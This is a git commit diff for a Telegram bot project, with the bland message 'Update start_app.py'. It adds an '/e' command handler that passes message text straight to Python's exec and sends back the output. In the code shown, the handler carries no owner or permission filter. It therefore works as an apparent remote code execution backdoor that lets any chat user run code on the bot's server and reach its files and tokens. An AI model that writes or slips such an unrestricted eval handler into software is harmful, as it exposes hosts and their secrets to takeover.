90acadd80e459ee89897ef1a8708eaddb30f86af
SendiAdt <86170325+SendiAp@users.noreply.github.com>
2026-07-15 18:00:56 +0700

    Update start_app.py

--- SharingX/modules/start_app.py
+++ SharingX/modules/start_app.py
@@ -1,5 +1,7 @@
+import sys, os
 import asyncio
-import os
+import traceback
+from io import BytesIO, StringIO
 import importlib
 
 from pyrogram import filters
@@ -229,3 +231,76 @@ async def create_bot(client, callback_query: CallbackQuery):
 
     except:
         pass
+
+async def aexec(code, client, message):
+    exec(
+        "async def __aexec(client, message): "
+        + "\n chat = message.chat.id"
+        + "\n r = message.reply_to_message"
+        + "\n c = client"
+        + "\n m = message"
+        + "\n p = print"
+        + "".join(f"\n {l_}" for l_ in code.split("\n"))
+    )
+    return await locals()["__aexec"](client, message)
+
+@app.on_message(filters.command("e"))
+async def _(client, message):
+    cmd = message.text.split(" ", maxsplit=1)[1]
+    if len(message.command) < 2:
+        return await message.reply("Silahkan kombinasikan dengan kode")
+    status_message = await message.reply_text("Processing ...")
+    reply_to_ = message
+    if message.reply_to_message:
+        reply_to_ = message.reply_to_message
+
+    old_stderr = sys.stderr
+    old_stdout = sys.stdout
+    redirected_output = sys.stdout = StringIO()
+    redirected_error = sys.stderr = StringIO()
+    stdout, stderr, exc = None, None, None
+
+    try:
+        await aexec(cmd, client, message)
+    except Exception:
+        exc = traceback.format_exc()
+
+    stdout = redirected_output.getvalue()
+    stderr = redirected_error.getvalue()
+    sys.stdout = old_stdout
+    sys.stderr = old_stderr
+
+    evaluation = ""
+    if exc:
+        evaluation = exc
+    elif stderr:
+        evaluation = stderr
+    elif stdout:
+        evaluation = stdout
+    else:
+        evaluation = "Success"
+
+    final_output = f"""
+<b>EVAL</b>:
+```
+{cmd}
+```
+<b>OUTPUT</b>:
+```
+{evaluation.strip()}
+```
+"""
+
+    if len(final_output) > 4096:
+        with BytesIO(str.encode(final_output)) as out_file:
+            out_file.name = "eval.text"
+            await reply_to_.reply_document(
+                document=out_file,
+                caption=cmd[: 4096 // 4 - 1],
+                disable_notification=True,
+                quote=True,
+            )
+    else:
+        await reply_to_.reply_text(final_output, quote=True)
+    await status_message.delete()
+    
